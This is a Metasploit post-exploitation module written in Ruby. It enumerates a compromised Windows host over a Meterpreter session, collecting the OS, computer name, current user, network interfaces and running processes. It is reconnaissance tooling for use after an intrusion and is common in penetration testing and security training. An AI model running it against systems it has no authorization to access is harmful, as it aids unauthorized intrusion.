require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::System
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Net
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Information Gathering Script',
      'Description'  => %q{
        Gathers OS, user, network, and process info from a Windows target after successful exploitation.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['Your Name'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options([
      OptInt.new('SESSION', [true, 'The session ID of the Meterpreter session to use'])
    ])
  end

  def run
    print_status("Gathering system information from #{session.session_host}")

    gather_system_info
    gather_user_info
    gather_network_info
    gather_running_processes
  end

  def gather_system_info
    os = sysinfo['OS']
    comp = sysinfo['Computer']
    print_good("OS: #{os}")
    print_good("Computer: #{comp}")
  end

  def gather_user_info
    user = cmd_exec("whoami")
    print_good("User: #{user}")
  end

  def gather_network_info
    interfaces = session.net.config.interfaces
    interfaces.each do |iface|
      iface_name = iface.name
      ip = iface.ip
      print_good("Interface: #{iface_name}, IP: #{ip}") if ip
    end
  end

  def gather_running_processes
    session.sys.process.processes.each do |proc|
      print_good("Process #{proc['pid']} â€“ #{proc['name']}")
    end
  end
end
